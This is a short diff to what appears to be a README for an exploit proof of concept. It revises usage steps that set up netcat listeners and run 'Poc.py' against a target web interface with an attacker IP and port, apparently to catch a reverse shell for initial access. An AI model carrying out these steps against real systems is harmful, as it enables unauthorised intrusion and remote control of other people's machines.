@@ -29,5 +29,8 @@
 # Steps
 
 1. initial access - setup initial listener (netcat/metasploit) with your (ANY PORT)
+    run command: `nc -lvnp <RANDOM_HIGH_PORT_FROM_CREATED_SCRIPT>`
 2. setup callback listener 63842
-3. run python Poc.py https://<IP> > <ATTACKER_IP> <ATTACKER_PORT>
+    run command: `nc -lvnp 63842`
+3. run python:
+    `python Poc.py https://<TARGET_PAL_WEB_INTERFACE_IP> <ATTACKER_IP> <ATTACKER_PORT>` # Random high port chosen in script from above
